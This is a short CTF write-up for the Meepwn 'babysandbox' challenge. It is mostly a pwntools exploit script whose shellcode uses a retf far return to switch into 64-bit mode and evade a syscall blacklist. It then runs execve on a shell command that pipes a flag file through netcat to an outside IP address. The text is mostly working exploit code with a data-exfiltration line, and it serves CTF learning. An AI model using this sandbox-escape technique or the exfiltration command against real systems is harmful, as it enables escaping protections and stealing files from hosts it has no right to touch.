# Meepwn CTF - babysandbox
* `retf` instroction change `cs` to 0x33 -> switch to x64 mode and execute x64 instruction.
* Different syscall number in x64 -> bypass snadbox badsyscall number black list.
```python
#!/usr/bin/env python
from pwn import *
from base64 import b64encode as b64en
import re

# MeePwnCTF{Unicorn_Engine_Is_So_Good_But_Not_Perfect}

#y = process( './bin' )
#pause()

x86 = asm('''
    call y              ; leave eip address on stack
y:
    pop ebx             ; pop get rip address
    mov eax, 0x33       ; cs 0x33 -> 64bit mode
    push eax
    add ebx, 0xc
    push ebx
    retf                ; retf instruction to switch to 64bit mode -> different syscall number to bypass sanbox
''')


context.arch = 'amd64'

cmd = 'cat flag| nc 12.345.666.77 3333\x00'

x64 = asm('''           ; execve( "/bin/sh" , ["sh","-c","cat flag| nc 12.345.666.77 3333"] )
    xor rdx, rdx

    mov rax, %s
    push rax
    mov rax, %s
    push rax
    mov rax, %s
    push rax
    mov rax, %s
    push rax
    mov rax, rsp

    mov rbx, 0x632d     ; -c
    push rbx
    mov rbx, rsp

    mov rcx, 0x6873     ; sh
    push rcx
    mov rcx, rsp

    push rdx
    push rax
    push rbx
    push rcx

    mov rsi, rsp
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    mov rax, 0x3b
    syscall

''' % tuple( hex(u64(_)) for _ in re.findall( '........' , cmd ) )[::-1] ) # execve( "/bin/sh" , ["sh","-c","cat flag| nc 12.345.666.77 3333"] )

y.send( x86 + x64 )

y.interactive()
```